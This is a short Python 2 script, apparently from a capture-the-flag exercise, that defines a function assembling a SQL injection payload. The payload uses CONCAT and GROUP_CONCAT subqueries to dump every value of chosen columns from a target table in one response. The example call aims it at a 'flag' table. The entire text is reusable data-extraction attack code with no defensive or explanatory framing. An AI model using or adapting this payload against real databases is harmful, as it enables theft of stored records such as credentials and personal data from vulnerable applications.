
def leak_table( table_name, column_names ):

	payload = ['SELECT CONCAT( ']

	#for column_name in column_names:
	for i in range(len(column_names)):

		column_name = column_names[i]

		payload.append('"\\n\\n' + '='*50 + '\\n' ) # Small header just for display...
		payload.append("TABLE: " + table_name + " | COLUMN: " + column_name + "\\n")
		payload.append("-" * 50 + '\\n", ')

		payload.append( '(SELECT GROUP_CONCAT( ' +column_name + ' SEPARATOR "\\n" ) FROM ' + table_name + '), ')
		payload.append( '"\\n' + '='*50 + '\\n\\n"' ) 

		if not i == len(column_names) - 1: # if this is not the last one
			payload.append(",")
		else:
			payload.append(")")

	return "".join(payload)

print leak_table( "flag", [ "flag"])
